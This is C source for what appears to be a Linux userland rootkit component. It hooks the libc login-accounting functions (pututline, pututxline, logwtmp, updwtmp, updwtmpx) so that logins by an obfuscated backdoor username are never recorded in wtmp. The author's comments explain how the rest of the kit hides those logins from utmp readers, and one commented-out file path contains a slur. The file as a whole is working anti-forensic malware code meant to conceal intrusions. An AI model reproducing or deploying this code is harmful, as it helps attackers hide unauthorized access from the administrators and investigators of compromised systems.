/*
 * These are the functions responsible for actually
 * writing data to the utmp & wtmp files.
 *
 * Now, I've prevented information from being written
 * to the wtmp file, but not the utmp file.
 * So calling strings on wtmp won't reveal anything,
 * but calling strings on utmp will show information.
 * But that's ONLY when using strings.
 *
 * See, there are functions in libc which handle
 * fetching entries from utmp, and it is those functions
 * that I have hooked.
 *
 * Essentially, I can't stop (well I can but not now)
 * information from being written to utmp, but I can prevent
 * said functions from even thinking that the information
 * is even there in the first place.
 *
 * utmp only stores information about the user's logged
 * in currently. Whereas wtmp is essentially a history of logins.
 * So this isn't even an issue unless you're logged into the
 * backdoor 24/7.
 */


// i tried many different tactics in order to straight up stop information
// from being written to the utmp file.
// this was my last-last attempt. (i probably will try different things, but for now hooking the 'read' functions works great)
struct utmp *pututline(const struct utmp *ut)
{
    HOOK(o_pututline,CPUTUTLINE);
    /*char *bduname=strdup(BD_UNAME); xor(bduname);
    if((ut && ut->ut_user != NULL) && !strncmp(ut->ut_user,bduname,sizeof(ut->ut_user)))
    {
        CLEAN(bduname);
        int xu=utmpname("/var/run/gayutmp");
        if(xu<0) return NULL;
        if(xu) return o_pututline(ut);
    }
    CLEAN(bduname);*/
    return o_pututline(ut);
}

struct utmpx *pututxline(const struct utmpx *utx)
{
    HOOK(o_pututxline,CPUTUTXLINE);
    /*char *bduname=strdup(BD_UNAME); xor(bduname);
    if((utx && utx->ut_user != NULL) && !strncmp(utx->ut_user,bduname,sizeof(utx->ut_user)))
    {
        CLEAN(bduname);
        int xu=utmpname("/var/run/gayutmp");
        if(xu<0) return NULL;
        if(xu) return o_pututxline(utx);
    }
    CLEAN(bduname);*/
    return o_pututxline(utx);
}

void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host)
{
    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(!strcmp(ut_name,bduname)) { CLEAN(bduname); return; }
    CLEAN(bduname);
    HOOK(o_logwtmp,CLOGWTMP);
    o_logwtmp(ut_line,ut_name,ut_host);
}

void updwtmp(const char *wfile, const struct utmp *ut)
{
    if(ut && ut->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strncmp(ut->ut_user,bduname,sizeof(ut->ut_user))) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_updwtmp,CUPDWTMP);
    o_updwtmp(wfile,ut);
}

void updwtmpx(const char *wfilex, const struct utmpx *utx)
{
    if(utx && utx->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strncmp(utx->ut_user,bduname,sizeof(utx->ut_user))) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_updwtmpx,CUPDWTMPX);
    o_updwtmpx(wfilex,utx);
}
